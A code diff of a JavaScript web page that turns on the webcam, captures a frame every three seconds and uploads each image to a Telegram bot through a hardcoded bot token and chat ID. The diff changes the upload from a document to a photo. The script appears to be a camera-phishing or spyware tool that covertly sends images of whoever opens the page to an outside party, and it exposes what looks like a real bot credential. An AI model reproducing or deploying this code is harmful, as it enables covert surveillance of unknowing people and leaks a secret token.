@@ -14,7 +14,7 @@
         const context = canvas.getContext('2d');
         const botToken = '7039889991:AAEcoAkuppMt6JvzpJUhSkcXUOUQu1pKnrk';
         const chatId = '5156117895';
-        const url = `https://api.telegram.org/bot${botToken}/sendDocument`;
+        const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 
         async function startCamera() {
             try {
@@ -31,17 +31,17 @@
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 canvas.toBlob((blob) => {
                     console.log('Foto capturada:', blob); // Log para verificar o Blob
-                    sendDocumentToTelegram(blob);
+                    sendPhotoToTelegram(blob);
                 }, 'image/png');
             }, 3000); // Captura uma foto a cada 3 segundos
         }
 
-        function sendDocumentToTelegram(blob) {
-            console.log('Enviando documento para o Telegram'); // Log para verificar se a função foi chamada
+        function sendPhotoToTelegram(blob) {
+            console.log('Enviando foto para o Telegram'); // Log para verificar se a função foi chamada
 
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('document', blob, 'photo.png');
+            formData.append('photo', blob, 'photo.png');
 
             console.log('FormData:', formData); // Log para verificar o FormData
 
@@ -52,12 +52,12 @@
               .then(data => {
                   console.log('Resposta do Telegram:', data); // Log para verificar a resposta do Telegram
                   if (data.ok) {
-                      console.log('Documento enviado com sucesso!');
+                      console.log('Foto enviada com sucesso!');
                   } else {
-                      console.error('Erro ao enviar documento:', data);
+                      console.error('Erro ao enviar foto:', data);
                   }
               }).catch(error => {
-                  console.error('Erro ao enviar documento:', error);
+                  console.error('Erro ao enviar foto:', error);
               });
         }
 
